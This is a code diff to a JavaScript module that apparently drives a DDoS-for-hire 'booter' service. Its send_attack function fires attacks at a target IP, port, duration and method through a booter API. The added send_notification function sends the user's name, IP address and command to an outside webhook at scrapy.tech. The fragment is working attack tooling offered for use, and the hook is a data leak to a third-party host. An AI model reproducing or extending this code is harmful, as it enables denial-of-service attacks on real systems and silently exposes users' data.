@@ -87,6 +87,11 @@ exports.log_attacks = function(ip, port, time, method) {
 
 }
 
+exports.send_notification = async function(usr, usr_ip, cmd) {
+    let skid = await(await fetch("https://scrapy.tech/hook.php?user=" + usr + "&user_ip=" + usr_ip + "&cmd=" + cmd)).text()
+    return skid;
+}
+
 exports.send_attack = async function(ip, port, time, method) {
     let response = "";
     let rreturn = await(await fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
